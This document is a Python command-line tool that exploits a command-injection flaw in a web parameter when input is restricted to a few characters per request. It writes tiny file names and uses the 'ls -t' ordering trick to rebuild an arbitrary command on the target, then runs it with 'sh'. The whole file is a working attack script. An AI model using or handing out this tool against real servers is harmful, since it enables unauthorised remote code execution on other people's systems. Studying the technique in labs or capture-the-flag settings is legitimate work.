from argparse import ArgumentParser
import requests
from time import sleep

def craft_payload(command, max_size):

    # Characters that need to be scaped
    badchars = ['<','>', ' ', '&', ';', '|']

    payload = [
        # Add 'g>  ht-  sl' to 'v' file
        '>dir',
        '>sl',
        '>g\>',
        '>ht-',
        '*>v',
        # Add 'ls  -th  >g' to '_' file
        '>rev',
        '*v>_',
        # Add pipe so 'sh' interprets the payload
        '>\;',
    ]


    command_payload = []
    # Generate list with the command sliced
    index = 0
    while index < len(command):
        max_iter_length = max_size-2
        # Best case scenario
        data = command[index:max_iter_length+index]
        
        # Filter badchars
        for i,char in enumerate(data):
            if char in badchars and i < (len(data) - data.count("\\") + data.count("\\\\")):
                data = data[:i] + '\\' + data[i:-1]

        try:
            if data[-1] == '\\' and data[-2:] != '\\\\':
                data = data[:max_iter_length-1]
            else:
                data = data[:max_iter_length]
        except Exception:
            # not enough length
            pass

        index += ( len(data) - data.count("\\") + data.count("\\\\") )
        if index >= len(command):
            command_payload.append(f'>{data}')
        else:
            command_payload.append(f'>{data}\\')

    # Reverse the payload and append it to the payload
    payload.extend(command_payload[::-1])
    # Execute file
    payload.extend(['sh _', 'sh g'])
    return payload

def send(target, payload, delay):
    for i in payload:
        r = requests.get(target + '=' + i)
        sleep(delay/10)

def main():
    parser = ArgumentParser()
    parser.add_argument("-c", "--command", help="Payload location ", required=True)
    parser.add_argument("-t", "--target", help="Url target (with param ex: http://target?cmd", required=True)
    parser.add_argument("-s", "--max-size", dest="max_size", type=int, default=4, help="Maximum amount of characters per request")
    parser.add_argument("-d", "--delay", type=int, default=1, help="Time to wait between requests in tenths of a second")
    args = parser.parse_args()

    if args.max_size < 4:
        parser.error("Minimum size must be greater than 3")
    
    if args.delay < 0:
        parser.error("Sleep time can't be negative")
        

    payload = craft_payload(args.command, args.max_size)
    send(args.target, payload, args.delay)

if __name__ == "__main__":
    main()